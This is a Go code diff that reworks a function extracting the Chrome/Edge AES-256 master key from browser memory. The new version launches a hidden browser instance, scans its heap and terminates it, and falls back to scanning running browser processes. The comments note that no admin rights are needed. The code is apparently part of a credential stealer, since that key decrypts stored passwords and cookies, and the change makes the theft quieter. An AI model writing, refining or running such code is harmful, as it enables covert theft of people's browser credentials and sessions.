@@ -350,30 +350,32 @@ func browserExeNames(browserName string) []string {
 
 // ── public entry point ───────────────────────────────────────────────────────
 
-// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key.
+// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key by
+// spawning a hidden browser instance, scanning its heap, then terminating it.
+// No admin rights required.
 //
-//   - If the browser is running: scans its heap directly (instant, no disruption).
-//   - If not running: spawns a hidden instance, waits for profile load (~2.5 s),
-//     scans memory, then terminates the spawned process.
-//
-// No admin rights required in either case.
+// If the browser is already running (profile lock held), the spawned process
+// exits quickly as a relay — in that case we fall back to scanning the running
+// instance directly, which also requires no elevation.
 func getKeyFromBrowserMemory(browserName string, ciphertext []byte) ([]byte, error) {
 	if len(ciphertext) < 15 {
 		return nil, fmt.Errorf("ciphertext too short for oracle")
 	}
 
-	// 1. Try running instances first — no disruption, no spawning.
-	exeNames := browserExeNames(browserName)
-	for _, pid := range findBrowserPIDs(exeNames) {
+	exePath := findBrowserExe(browserName)
+	if exePath != "" {
+		if key, err := spawnHiddenBrowser(exePath, ciphertext); err == nil {
+			return key, nil
+		}
+	}
+
+	// Spawn failed or exe not found — browser may already be running (profile
+	// lock prevents a second instance from loading the profile). Scan it directly.
+	for _, pid := range findBrowserPIDs(browserExeNames(browserName)) {
 		if key, err := scanPIDForKey(pid, ciphertext); err == nil {
 			return key, nil
 		}
 	}
 
-	// 2. Browser not running — spawn it hidden, scan, kill.
-	exePath := findBrowserExe(browserName)
-	if exePath == "" {
-		return nil, fmt.Errorf("browser not running and executable not found: %s", browserName)
-	}
-	return spawnHiddenBrowser(exePath, ciphertext)
+	return nil, fmt.Errorf("could not extract key for %s", browserName)
 }
